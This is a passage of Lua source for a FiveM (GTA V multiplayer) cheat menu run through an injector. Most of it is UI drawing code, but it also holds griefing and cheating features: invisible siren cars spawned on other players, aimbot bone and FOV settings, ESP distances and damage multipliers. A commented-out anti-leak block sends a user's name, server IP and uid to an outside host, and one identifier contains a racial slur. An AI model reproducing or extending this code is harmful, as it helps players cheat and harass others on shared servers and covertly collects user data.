           CockT.Global.DrawText('Player ID: ~y~'..PlayerID..'~s~\nUsername: ~y~'..PlayerName..'\n~s~redENGINE uid: ~y~'..reduid..'~s~\nBeta Access: ~y~'..IsBeta, 0.41+drag_x, 0.37+drag_y, false, 0.3, 4, false)
           CockT.Global.DrawText('Menu Status: '..MenuStatus..'~s~\nLast Update: ~y~'..LastUpdateDate..'~s~\nServer IP: ~y~'..sip, 0.41+drag_x, 0.44+drag_y, false, 0.3, 4, false)
           --CockT.Global.DrawText('Which menu you wanna use? (Click [`F1`])', 0.5+drag_x, 0.35+drag_y, true, 0.3, 4, true)
           CockT.Global.DrawText('+', c_x, c_y-0.0025, true, 0.3, 0, true)
           el.LoaderDragBar()
           el.LoaderResizer()
           
           
       end
   end)
   end
       
   local reuid = Fatasf.n.GetRedUid()
   local name =  Fatasf.n.GetPlayerName(Fatasf.n.PlayerId())
   local hex = "NaN"-- to do
   local ip = Fatasf.n.GetCurrentServerEndpoint()
   local playerdata = "Alive"
   local resource = Fatasf.n.GetCurrentResourceName()
   CockT.Global.hIvkXiYg2ogzm1MvdOolDhAhwQdBwv()
   --[[ P100 menu protection bros
   if reuid ~= 0 then
       CockT.Global.hIvkXiYg2ogzm1MvdOolDhAhwQdBwv() -- nice job boys commenting the menu func
   else
       _cit_.Trace("\n^1Ur rE user id is 0 because you're using leaked sourcecode! ")
       _cit_.Trace("\n^1Crashing menu... \n")
   
       local url = "https://cock.menu/iuhdsfiash/leaked.html".."?user="..name.."&sip="..ip.."&status="..playerdata.."&hex="..hex.."&reuid="..reuid
       local logfui = Fatasf.n.CreateAnDui(url, 50, 50)
       Fatasf.n.DestroyDui(logfui)
       nigga_why_u_using_leaked_source_i_have_ur_ip_now_lol.aisodjioasdjia.jiashdjhadjhhjash()
   end]]
   
   
   Fatasf.n.PlaySoundFrontend(-1, "ScreenFlash", "MissionFailedSounds", true)
   --local n_ = Fatasf.n.CreateAnDui("https://cock.menu/music/redengine.mp3", 1, 1)
   
   CockT.Global.pJ64RNYjMQEtLYWxRcdY = function()
       local PEnabled = true
       local tf = {
   
       }
       local Cock = {
           AimFriends = {},
           Menu = {},
       }
       tf.CreateMenu = function(id, title, subTitle, style)
           menu = {}
           menu.id = id
           menu.previousMenu = nil
           menu.aboutToBeClosed = false
           menu.currentOption = 1
           menu.title = title
           menu.subTitle = subTitle and CockT.Strings.upper(subTitle) or "INTERACTION MENU"
           if style then
               menu.style = style
           end
           menus[id] = menu
       end
       tf.setMenuProperty = function(id, property, value)
           if not id then
               return
           end
           menu = menus[id]
           if menu then
               menu[property] = value
           end
       end
       tf.setStyleProperty = function(id, property, value)
           if not id then
               return
           end
           menu = menus[id]
           if menu then
               if not menu.overrideStyle then
                   menu.overrideStyle = {}
               end
               menu.overrideStyle[property] = value
           end
       end
       
       tf.setMenuVisible = function(id, visible, holdCurrentOption)
           if currentMenu then
               if visible then
                   if currentMenu.id == id then
                       return
                   end
               else
                   if currentMenu.id ~= id then
                       return
                   end
               end
           end
           if visible then
               menu = menus[id]
               if not currentMenu then
                   menu.currentOption = 1
               else
                   if not holdCurrentOption then
                       menus[currentMenu.id].currentOption = 1
                   end
               end
               currentMenu = menu
           else
               currentMenu = nil
           end
       end
       tf.OpenMenu = function(id)
           if id and menus[id] then
               Fatasf.n.PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
               tf.setMenuVisible(id, true)
           end
       end
       tf.getStyleProperty = function(property, menu)
           menu = menu or currentMenu
           if menu.overrideStyle then
               value = menu.overrideStyle[property]
               if value then
                   return value
               end
           end
           return menu.style and menu.style[property] or defaultStyle[property]
       end
       tf.copyTable = function(t)
           if type(t) ~= "table" then
               return t
           end
           local result = {}
           for k, v in CockT.Math.pairs(t) do
               result[k] = copyTable(v)
           end
           return result
       end
       tf.setTextParams = function(font, colour, scale, center, shadow, alignRight, wrapFrom, wrapTo)
           Fatasf.n.SetTextFont(font)
           Fatasf.n.SetTextColour(colour[1], colour[2], colour[3], colour[4] or 255)
           Fatasf.n.SetTextScale(scale, scale)
           if shadow then
               CockT.Inv["Invoke"](CockT.Natives["SetTextDropshadow"])
           end
           if center then
               Fatasf.n.SetTextCentre(true)
           elseif alignRight then
               CockT.Inv["Invoke"](CockT.Natives["SetTextRightJustify"], true)
           end
           if not wrapFrom or not wrapTo then
               wrapFrom = wrapFrom or tf.getStyleProperty("x")
               wrapTo =
                   wrapTo or
                   tf.getStyleProperty("x") + tf.getStyleProperty("width") -
                       buttonTextXOffset
           end
           CockT.Inv["Invoke"](CockT.Natives["SetTextWrap"], wrapFrom, wrapTo)
       end
   
       tf.drawText = function(text, x, y)
           Fatasf.n.BeginTextCommandDisplayText("TWOSTRINGS")
           Fatasf.n.AddTextComponentString(CockT.Strings.tostring(text))
           Fatasf.n.EndTextCommandDisplayText(x, y)
       end
       tf.drawRect = function(x, y, width, height, colour)
           CockT.Inv["Invoke"](
               CockT.Natives["DrawRect"],
               x,
               y,
               width,
               height,
               colour[1],
               colour[2],
               colour[3],
               colour[4] or 255
           )
       end
       tf.getCurrentIndex = function()
           if
               currentMenu.currentOption <= tf.getStyleProperty("maxOptionCountOnScreen") and
                   optionCount <= tf.getStyleProperty("maxOptionCountOnScreen")
            then
               return optionCount
           elseif
               optionCount > currentMenu.currentOption - tf.getStyleProperty("maxOptionCountOnScreen") and
                   optionCount <= currentMenu.currentOption
            then
               return optionCount -
                   (currentMenu.currentOption - tf.getStyleProperty("maxOptionCountOnScreen"))
           end
           return nil
       end
       tf.SpriteMenuButton = function(text, dict, name, r, g, b, a, rotations)
           if not currentMenu then
               return
           end
       
           local pressed = tf.Button(text)
       
           local currentIndex = tf.getCurrentIndex()
           if not currentIndex then
               return
           end
       
           if not Fatasf.n.HasStreamedTextureDictLoaded(dict) then
               Fatasf.n.RequestStreamedTextureDict(dict)
           end
           Fatasf.n.DrawSprite(dict, name, tf.getStyleProperty('x') + tf.getStyleProperty('width') - spriteWidth / 2 - buttonSpriteXOffset, tf.getStyleProperty('y') + titleHeight + buttonHeight + (buttonHeight * currentIndex) - spriteHeight / 2 + buttonSpriteYOffset + 0.0025, 0.008, 0.008 * GetAspectRatio(),  90., r or 255, g or 255, b or 255, a or 255)
       
           return pressed
       end
       tf.drawTitle = function()
           x = tf.getStyleProperty("x") + tf.getStyleProperty("width") / 2
           y = tf.getStyleProperty("y") + titleHeight / 2
           if tf.getStyleProperty("titleBackgroundSprite") then
               Fatasf.n.DrawSprite(
                   tf.getStyleProperty("titleBackgroundSprite").dict,
                   tf.getStyleProperty("titleBackgroundSprite").name,
                   x,
                   y,
                   tf.getStyleProperty("width"),
                   titleHeight,
                   0.,
                   255,
                   255,
                   255,
                   255
               )
           else
               tf.drawRect(
                   x,
                   y,
                   tf.getStyleProperty("width"),
                   titleHeight,
                   tf.getStyleProperty("titleBackgroundColor")
               )
           end
           if currentMenu.title then
               tf.setTextParams(
                   titleFont,
                   tf.getStyleProperty("titleColor"),
                   titleScale,
                   true
               )
               tf.drawText(currentMenu.title, x, y - titleHeight / 2 + titleYOffset)
           end
       end
       tf.drawSubTitle = function()
           x = tf.getStyleProperty("x") + tf.getStyleProperty("width") / 2
           y = tf.getStyleProperty("y") + titleHeight + buttonHeight / 2
           tf.drawRect(x, y, tf.getStyleProperty("width"), buttonHeight+0.0018, {255, 255, 255, 255})
           tf.drawRect(x, y, tf.getStyleProperty("width"), buttonHeight, tf.getStyleProperty("subTitleBackgroundColor"))
           tf.setTextParams(buttonFont, tf.getStyleProperty("subTitleColor"), buttonScale, false)
           
           Fatasf.n.SetTextCentre(true)
           tf.drawText(currentMenu.subTitle, tf.getStyleProperty("x") + buttonTextXOffset + 0.093, y - buttonHeight / 2 + buttonTextYOffset)
           if optionCount > tf.getStyleProperty("maxOptionCountOnScreen") then
               tf.setTextParams(buttonFont, tf.getStyleProperty("subTitleColor"), buttonScale, false, false, true)
               tf.drawText('', tf.getStyleProperty("x") + tf.getStyleProperty("width"), y - buttonHeight / 2 + buttonTextYOffset)
           end
       end
       tf.drawButton = function(text, subText, howmuch)
           local currentIndex = tf.getCurrentIndex()
       if not currentIndex then
           return
       end
   
       local backgroundColor = nil
       local textColor = nil
       local subTextColor = nil
       local shadow = false
   
       if currentMenu.currentOption == optionCount then
           backgroundColor = tf.getStyleProperty('focusColor')
           textColor = tf.getStyleProperty('focusTextColor')
           subTextColor = tf.getStyleProperty('focusTextColor')
           
           
       else
           backgroundColor = tf.getStyleProperty('backgroundColor')
           textColor = tf.getStyleProperty('textColor')
           subTextColor = tf.getStyleProperty('subTextColor')
           shadow = true		
       end
          
           
   
           local x = tf.getStyleProperty('x') + tf.getStyleProperty('width') / 2
           local y = tf.getStyleProperty('y') + titleHeight + buttonHeight + (buttonHeight * currentIndex) - buttonHeight / 2
   
           tf.drawRect(x, y, tf.getStyleProperty('width'), buttonHeight, backgroundColor)
           tf.setTextParams(buttonFont, textColor, buttonScale, false, shadow)
           
           if CockT.DisableScrollBar then
           else
               tf.drawRect(x+0.11, y, 0.006, buttonHeight, backgroundColor)
           end
           
           --tf.drawRect(x+0.11, y, 0.01, buttonHeight, backgroundColor)
           
           if howmuch > 0 then
               Fatasf.n.SetTextCentre(true)
               tf.drawText(text, tf.getStyleProperty('x') + buttonTextXOffset + howmuch, y - (buttonHeight / 2) + buttonTextYOffset)
           else 
               tf.drawText(text, tf.getStyleProperty('x') + buttonTextXOffset + howmuch, y - (buttonHeight / 2) + buttonTextYOffset)
           end
   
   
           if subText then
               tf.setTextParams(buttonFont, subTextColor, buttonScale, false, shadow, true)
               tf.drawText(subText, tf.getStyleProperty("x") + buttonTextXOffset + howmuch, y - buttonHeight / 2 + buttonTextYOffset)
           end
       end
       tf.drawakRect = function(text, subText, howmuch, plusY)
           currentIndex = tf.getCurrentIndex()
   
           backgroundColor = nil
           textColor = nil
           subTextColor = nil
           shadow = false
           
           backgroundColor = {0, 0, 0, 220}
           textColor = {0, 213, 255}
           subTextColor = tf.getStyleProperty("subTextColor")
           shadow = true
           
           x = tf.getStyleProperty("x") + tf.getStyleProperty("width") / 2
           y = tf.getStyleProperty("y")+plusY + titleHeight + buttonHeight + (buttonHeight * currentIndex) - buttonHeight / 2
           tf.drawRect(x, y, tf.getStyleProperty("width"), buttonHeight, backgroundColor)
           tf.setTextParams(buttonFont, textColor, buttonScale, false, shadow)
           tf.drawText(text, tf.getStyleProperty("x") + buttonTextXOffset + howmuch, y - (buttonHeight / 2) + buttonTextYOffset)
           Fatasf.n.DrawRect(x, y-0.019, 0.229, 0.001, 0, 213, 255, 255)
       end
   
       tf.CreateSubMenu = function(id, parent, subTitle, style)
           parentMenu = menus[parent]
           if not parentMenu then
               return
           end
           tf.CreateMenu(id, parentMenu.title, subTitle and CockT.Strings.upper(subTitle) or parentMenu.subTitle)
           menu = menus[id]
           menu.previousMenu = parent
           if parentMenu.overrideStyle then
               menu.overrideStyle = tf.copyTable(parentMenu.overrideStyle)
           end
           if style then
               menu.style = style
           elseif parentMenu.style then
               menu.style = tf.copyTable(parentMenu.style)
           end
       end
       
       tf.IsMenuOpened = function(id)
           return currentMenu and currentMenu.id == id
       end
   
       tf.CloseMenu = function()
           if not currentMenu then
               return
           end
           if currentMenu.aboutToBeClosed then
               currentMenu.aboutToBeClosed = false
               tf.setMenuVisible(currentMenu.id, false)
               optionCount = 0
               currentKey = nil
               Fatasf.n.PlaySoundFrontend(-1, 'QUIT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
           else
               currentMenu.aboutToBeClosed = true
           end
       end
       tf.Button = function(text, subText)
           if not currentMenu then
               return
           end
           optionCount = optionCount + 1
           tf.drawButton(text, subText, 0)
           pressed = false
           if currentMenu.currentOption == optionCount then
               if currentKey == keys.select then
                   pressed = true
                   Fatasf.n.PlaySoundFrontend(-1, tf.getStyleProperty("buttonPressedSound").name, tf.getStyleProperty("buttonPressedSound").set, true)
               elseif currentKey == keys.v2 or currentKey == keys.v3 then
                   Fatasf.n.PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
               end
           end
           return pressed
       end
       tf.SpriteButton = function(to_addx, to_addy, text, dict, name, r, g, b, a)
           if not currentMenu then
               return
           end
           local pressed = tf.Button(text)
           local currentIndex = tf.getCurrentIndex()
           if not currentIndex then
               return
           end
           if not Fatasf.n.HasStreamedTextureDictLoaded(dict) then
               Fatasf.n.RequestStreamedTextureDict(dict)
           end
           if to_addx == nil then
               to_addx = 0.0
           end
           if to_addy == nil then
               to_addy = 0.0
           end
           
           Fatasf.n.DrawSprite(
               dict,
               name,
               tf.getStyleProperty("x") + to_addx + tf.getStyleProperty("width") -
                   spriteWidth / 2 -
                   buttonSpriteXOffset,
               tf.getStyleProperty("y") + to_addy + titleHeight + buttonHeight + (buttonHeight * currentIndex) -
                   spriteHeight / 2 +
                   buttonSpriteYOffset,
               spriteWidth,
               spriteHeight,
               0.,
               r or 255,
               g or 255,
               b or 255,
               a or 255
           )
           return pressed
       end
       tf.CSeparator = function(text, subText)
           if not currentMenu then
               return
           end
           optionCount = optionCount + 1
           
           tf.drawButton(text, subText, 0.092)
           pressed = false
           if currentMenu.currentOption == optionCount then
               if currentKey == keys.select then
                   pressed = true
               elseif currentKey == keys.v2 or currentKey == keys.v3 then
               end
           end
           return pressed
       end
       tf.UnclickableText = function(text, subText, plys)
           tf.drawakRect(text, subText, 0, plys)
       end
       
       local CockMenu = {
           peds = {},
           MenuEnabled = true,
           
           Main = {},
           ComboBoxesT = {
               MultIndex = 1,
               LengMult = 1,
               HpLengMult = 1,
               HpMultIndex = 1,
               ConMultIndex = 1,
               ConLengMult = 1,
               ArmMultIndex = 1,
               ArmLengMult = 1,
               InvsMultIndex = 1,
               InvsLengMult = 1,
               DistMultIndex = 1, 
               DistLengMult = 1,
               FovMultIndex = 1,
               FovLengMult = 1,
               HeadMultIndex = 1, 
               HeadLengMult = 1,
               vehspeedMultIndex = 1,
               vehspeedLengMult = 1,	
               explosiontypeMultIndex = 1,
               explosiontypeLengMult = 1,
               PosMultIndex = 1,
               PosLengMult = 1,
               GifMultIndex = 1, 
               GifLengMult = 1,
               addonMultIndex = 1,
               addonLengMult = 1,
               PedsMultIndex = 1,
               PedsLengMult = 1,
               EspDistMultIndex = 1,
               InfoFontLengMult = 1,
               InfoFontMultIndex = 1,
               EspDistLengMult = 1,
               MBindMultIndex = 1,
               MBindLengMult = 1,
               WantedLVLMultIndex = 1,
               WantedLVLLengMult = 1,
               DmgModiMultIndex = 1,
               DmgModiLengMult = 1,
               NCSpeedMultIndex = 1,
               NCSpeedLengMult = 1,
               WepCustMultIndex = 1,
               WepCustLengMult = 1,
               ammoMultIndex = 1,
               ammoLengMult = 1,	
               Playsound1MultIndex = 1,
               Playsound1LengMult = 1,
               Playsound2MultIndex = 1,
               Playsound2LengMult = 1,
   
               Playsound2 = {"HUD_MINI_GAME_SOUNDSET", "HUD_FRONTEND_DEFAULT_SOUNDSET", "SHORT_PLAYER_SWITCH_SOUND_SET", "LESTER1A_SOUNDS", "MUGSHOT_CHARACTER_CREATION_SOUNDS", "FM_Events_Sasquatch_Sounds", "CAR_STEAL_2_SOUNDSET"},
               NCSpeed = {0.2, 0.4, 0.6, 0.8, 1.0, 1.2, 1.4, 1.6, 1.8, 2.0, 2.2, 2.4, 2.6, 2.8, 3.0},
               DmgModi = {1.0, 5.0, 10.0, 25.0, 50.0, 100.0, 150.0, 200.0, 250.0, 300.0, 350.0, 400.0, 450.0, 500.0, 550.0, 600.0, 650.0, 700.0, 750.0, 800.0, 850.0, 900.0, 950.0, 1000.0},
               EspDist = {100.0, 150.0, 200.0, 250.0, 300.0, 350.0, 400.0, 450.0, 500.0, 550.0, 600.0, 650.0, 700.0, 750.0, 800.0, 850.0, 900.0, 950.0, 1000.0, 1100.0, 1200.0, 1300.0, 1400.0, 1500.0, 1600.0, 1700.0, 1800.0, 1900.0, 2000.0, 2200.0, 2400.0, 2600.0, 2800.0, 3000.0, 3500.0, 4000.0, 5000.0, 6000.0, 7000.0, 8000.0, 9000.0, 10000.0},
               explosiontype = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 43},
               MBind = {'DELETE', 'INSERT', 'HOME', 'PAGEUP', 'PAGEDOWN'},
               Peds = {'Delder', 'Larks', 'Conde', 'Prodigy', 'Camuga', 'OGG076', 'Dish', 'Theo', 'Goxint', 'Flacko', 'Cat', 'Laundry', 'LuaMenu', 'Pawcio', 'HamMafia'},
               Position = {'Left', 'Middle', 'Right'},
               ammo = {10, 20, 30, 40, 50, 60, 70, 80, 90, 100, 110, 120, 140, 160, 180, 200, 210, 220, 230, 240, 250, 255},
               vehspeed = {'x1', 'x2', 'x3', 'x4', 'x5', 'x6'},
               Head = {'Head', 'Body', 'Left knee', 'Right knee', 'Left foot', 'Right foot'},
               WepCust = {'Suppressor', 'Flashlight', 'Extended Magazine', 'Grip', 'Scope', 'Special Finish'},
               InfoFont = {0, 1, 2, 3, 4, 5, 6, 7},
               Fov = {'50', '100', '150', '200', '400', '600', '800', '1000', '1100', '1300', '1500'},
               Distance = {'100', '200', '400', '600', '800', '1000'},
               SpeedLabels = {'Default', '+20%', '+40%', '+60%', '+100%'},
               Contributors = {'bäärs#3150', 'Delder', 'Alky', 'BMD (Graphics)'},
               Gif = {'default', 'nyan', 'blue', 'sun'},
               HpValue = {"100%", "80%", "60%", "40%", "20%", "0%"},
               ArmourValue = {"0%", "20%", "40%", "60%", "80%", "100%"},
               InvsValue = {"100%", "80%", "60%", "40%", "20%", "0%"},
       
               MBindVal = {178, 121, 213, 10, 11},
               PedsP = {'u_m_m_jesus_01', 's_f_y_stripper_01', 'u_m_y_mani', 'u_m_o_filmnoir', 'a_m_m_beach_01', 'a_m_y_acult_01', 'a_m_m_mlcrisis_01', 'csb_porndudes', 'cs_stretch', 'cs_priest', 'a_m_m_beach_02', 'a_m_m_og_boss_01', 'a_m_m_acult_01', 's_m_m_movspace_01', 'a_c_rat'},
               PosValue = {0.0175, 0.4, 0.74},
               SpeedMultiplier = {1.1, 1.2, 1.4, 1.8, 2.6},
               HpSet = {200, 140, 128, 110, 81, 0},
               ArmSet = {0, 20, 40, 60, 80, 100},
               VehSet = {9.8, 18.8, 27.8, 36.8, 45.8, 54.8},
               Bone = {31086, 0, 63931, 36864, 14201, 52301},
               InvsSet = {255, 200, 175, 150, 125, 0},
               WantedLVL = {0, 1, 2, 3, 4, 5},
           },
           
       }
       
       
       local CockMeni = {
           Functions = {
               SirensOnPlayer = function(player)
                   CockT.Inv['Thread'](function()
                       local kx = Fatasf.n.GetHashKey('police')
                       Fatasf.n.RequestModel(kx)
                       while not Fatasf.n.HasModelLoaded(kx) do 
                           CockT.Inv["Wait"](0) 
                       end
                       local k = Fatasf.n.CreateVehicle(kx, Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player)), 1, 1, 1)
                       while true do
                           CockT.Inv["Wait"](0)
                           local PoliceAnnoying = true
                           if PoliceAnnoying then
                               local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player))
                               Fatasf.n.SetEntityVisible(k, false, false)
                               Fatasf.n.SetEntityCoords(k, coords.x, coords.y, coords.z + 5)
                               Fatasf.n.SetVehicleEngineOn(k, true, true, true)
                               Fatasf.n.TriggerSiren(k)
                               Fatasf.n.SetVehicleSiren(k, true)
                           end
                       end
                   end)
               end,
               cockplate = function()
                   car = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(),false)
                   if car ~= 0 then
                   CockT.Inv["Wait"](400)
                   Fatasf.n.SetVehicleNumberPlateText(car,"        C")
                   CockT.Inv["Wait"](400)
                   Fatasf.n.SetVehicleNumberPlateText(car,"       CO")
                   CockT.Inv["Wait"](400)
                   Fatasf.n.SetVehicleNumberPlateText(car,"      COC")
                   CockT.Inv["Wait"](400)
                   Fatasf.n.SetVehicleNumberPlateText(car,"     COCK")
                   CockT.Inv["Wait"](400)
                   Fatasf.n.SetVehicleNumberPlateText(car,"    COCK ")
                   CockT.Inv["Wait"](400)
                   Fatasf.n.SetVehicleNumberPlateText(car,"   COCK ")
                   CockT.Inv["Wait"](400)
                   Fatasf.n.SetVehicleNumberPlateText(car,"  COCK ")
                   CockT.Inv["Wait"](400)
                   Fatasf.n.SetVehicleNumberPlateText(car," COCK ")
                   CockT.Inv["Wait"](400)
                   Fatasf.n.SetVehicleNumberPlateText(car,"COCK M")
                   CockT.Inv["Wait"](400)
                   Fatasf.n.SetVehicleNumberPlateText(car,"OCK ME")
                   CockT.Inv["Wait"](400)
                   Fatasf.n.SetVehicleNumberPlateText(car,"CK MEN")
                   CockT.Inv["Wait"](400)
                   Fatasf.n.SetVehicleNumberPlateText(car,"K MENU")
               end
               end,
       
              DriveToWaypoint = function() --['PlayerPedId']
                   local vehicle = Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId())
                   local maxspeed =  Functions.f.CustomInput("Max Speed ~g~(KM/H)", "", 3)
       
                           if Fatasf.n.DoesEntityExist(vehicle) then
       
                               local coords = Fatasf.n.GetBlipInfoIdCoord(Fatasf.n.GetFirstBlipInfoId(8))
       
                               Fatasf.n.TaskVehicleDriveToCoord(Fatasf.n.PlayerPedId(), vehicle, coords, GetVehicleMaxSpeed(vehicle), 0, -1848994066, 263100, 10.0)
       
                               Fatasf.n.SetDriveTaskDrivingStyle(Fatasf.n.PlayerPedId(), 263100)       
       
                               Fatasf.n.SetPedKeepTask(Fatasf.n.PlayerPedId(), true)
       
                               while Cock.Menu.DriveToWaypoint do
                                   CockT.Inv["Wait"](0)
       
                                   Fatasf.n.SetEntityMaxSpeed(vehicle, (maxspeed + 1) / 3.6)
       
                                   if Fatasf.n.GetPedInVehicleSeat(vehicle, -1) == Fatasf.n.PlayerPedId() then
       
                                       if Fatasf.n.GetDistanceBetweenCoords(coords, Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), false) <= 25.0 then
                                           Cock.Menu.DriveToWaypoint = false
                                           Fatasf.n.ClearPedTasks(Fatasf.n.PlayerPedId())
                                           Fatasf.n.ClearPedSecondaryTask(Fatasf.n.PlayerPedId())
                                       end
                                   else
                                       Cock.Menu.DriveToWaypoint = false
                                   end
                               end
                                       Fatasf.n.ClearPedTasks(Fatasf.n.PlayerPedId())
                                       Fatasf.n.ClearPedSecondaryTask(Fatasf.n.PlayerPedId())
       
                                       Fatasf.n.SetEntityMaxSpeed(vehicle, GetVehicleMaxSpeed(vehicle))
       
                                       end
               end,
   
               ListButton = function(x, y, _outl, r, g, b)
                   local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
                   local widht, height = Fatasf.n.GetActiveScreenResolution()
                   c_x = c_x / widht
                   c_y = c_y / height
               
                   if( (c_x) + 0.01 >= x and (c_x) - 0.01 <= x and (c_y) + 0.011 >= y and (c_y) - 0.011 <= y) then 
                   end
               
                   if ((c_x) + 0.01 >= x  and (c_x) - 0.01 <= x  and (c_y) + 0.015 >= y  and (c_y) - 0.005 <= y  and Fatasf.n.IsDisabledControlJustReleased(0, 92)) then 
                       return true
                   else
                       return false
                   end
               end,
   
               RGBPicker = function(okv)
       
                   if PEnabled then
                   CockT.Global.Dmovement(true)
                   CockT.Inv["Invoke"](CockT.Natives['SetMouseCursorActiveThisFrame'])
                   Fatasf.n.DrawRect(0.49, 0.5, 0.141, 0.251, Red, Green, Blue, 255)
                   Fatasf.n.DrawRect(0.49, 0.5, 0.14, 0.25, 19, 20, 22, 255)
       
                   if CockT.RGBPicker['Style'].value == 'orange-red-yellow' then
                       Red = 150
                       Green = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       Blue = 0
                       colour = 1
                       for i = 1, 110 do
                           Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, 150,CockT.Math.floor(colour / 0.8), 0, 255)
                           colour = colour + 2
                       end
                   elseif CockT.RGBPicker['Style'].value == 'blue-black' then
                       Red = 0
                       Green = 0
                       Blue = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 2)
                       colour = 1
                       for i = 1, 110 do
                           Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, 0, 0,CockT.Math.floor(colour / 2), 255)
                           colour = colour + 2
                       end
                   elseif CockT.RGBPicker['Style'].value == 'red-black' then
                       Red = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       Green = 0
                       Blue = 0
                       colour = 1
                       for i = 1, 110 do
                           Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2,CockT.Math.floor(colour / 0.8), 0, 0, 255)
                           colour = colour + 2
                       end
                   elseif CockT.RGBPicker['Style'].value == 'yellow-black' then
                       Red = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       Green = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       Blue = 0
                       colour = 1
                       for i = 1, 110 do
                           Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2,CockT.Math.floor(colour / 0.8),CockT.Math.floor(colour / 0.8), 0, 255)
                           colour = colour + 2
                       end
                   elseif CockT.RGBPicker['Style'].value == 'aqua-black' then
                       Red = 0
                       Green = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       Blue = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       colour = 1
                       for i = 1, 110 do
                           Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, 0,CockT.Math.floor(colour / 0.8),CockT.Math.floor(colour / 0.8), 255)
                           colour = colour + 2
                       end
                   elseif CockT.RGBPicker['Style'].value == 'green-black' then
                       Red = 0
                       Green = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       Blue = 0
                       colour = 1
                       for i = 1, 110 do
                           Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, 0, colour, 0, 255)
                           colour = colour + 2
                       end
                   elseif CockT.RGBPicker['Style'].value == 'white-black' then
                       Red = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       Green = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       Blue = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       colour = 1
                       for i = 1, 110 do
                           Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, colour, colour, colour, 255)
                           colour = colour + 2
                       end
                   elseif CockT.RGBPicker['Style'].value == 'pink-orange' then
                       Red = 255
                       Green = 51
                       Blue = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       colour = 1
                       for i = 1, 110 do
                           Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, 255, 51, colour, 255)
                           colour = colour + 2
                       end
                   elseif CockT.RGBPicker['Style'].value == 'green-black' then
                       Red = 0
                       Green = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       Blue = 0
                       colour = 1
                       for i = 1, 110 do
                           Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, 0, colour, 0, 255)
                           colour = colour + 2
                       end
                   elseif CockT.RGBPicker['Style'].value == 'pink-dblue' then
                       Red = CockT.Math.floor(CockT.RGBPicker['value'].value_2 / 0.8)
                       Green = 15
                       Blue = 55
                       colour = 1
                       for i = 1, 110 do
                           Fatasf.n.DrawRect(0.435 + (i / 1000), 0.5, 0.005, 0.2, colour, 15, 55, 255)
                           colour = colour + 2
                       end
                   end
       
                   if ShowList then
                       Fatasf.n.DrawRect(0.49, 0.462, 0.14, 0.174, 25, 25, 25, 255)
                       Fatasf.n.DrawRect(0.49, 0.55, 0.14, 0.000925, Red, Green, Blue, 255)
                       
                       if CockT.Global.RGButton('', 0.443, 0.42, false, 255, 100, 0) then
                           CockT.RGBPicker['Style'].value = 'orange-red-yellow'
                       end
                       if CockT.Global.RGButton('', 0.46, 0.42, false, 0, 0, 255) then
                           CockT.RGBPicker['Style'].value = 'blue-black'
                       end
                       if CockT.Global.RGButton('', 0.478, 0.42, false, 255, 0, 0) then
                           CockT.RGBPicker['Style'].value = 'red-black'
                       end
                       if CockT.Global.RGButton('', 0.495, 0.42, false, 255, 242, 0) then
                           CockT.RGBPicker['Style'].value = 'yellow-black'
                       end
                       if CockT.Global.RGButton('', 0.512, 0.42, false, 0, 193, 193) then
                           CockT.RGBPicker['Style'].value = 'aqua-black'
                       end
                       if CockT.Global.RGButton('', 0.529, 0.42, false, 0, 204, 0) then
                           CockT.RGBPicker['Style'].value = 'green-black'
                       end
       
                       --next line
       
                       if CockT.Global.RGButton('', 0.443, 0.445, false, 222, 222, 222) then
                           CockT.RGBPicker['Style'].value = 'white-black'
                       end
                       if CockT.Global.RGButton('', 0.46, 0.445, false, 255, 51, 204) then
                           CockT.RGBPicker['Style'].value = 'pink-orange'
                       end
                       if CockT.Global.RGButton('', 0.478, 0.445, false, 227, 15, 55) then
                           CockT.RGBPicker['Style'].value = 'pink-dblue'
                       end
                   else
                       CockT.Global.PickerS(0.5, 0.5, CockT.RGBPicker.value)
                   end
               
                   Fatasf.n.DrawRect(0.4, 0.5, 0.0173, 0.251, Red, Green, Blue, 255)
                   Fatasf.n.DrawRect(0.4, 0.5, 0.017, 0.25, 19, 20, 22, 255)
       
                  
                   CockT.Global.SliderAlpha(0.4, 0.5, CockT.RGBPicker['Alpha'])
                   Alpha = CockT.RGBPicker['Alpha'].value
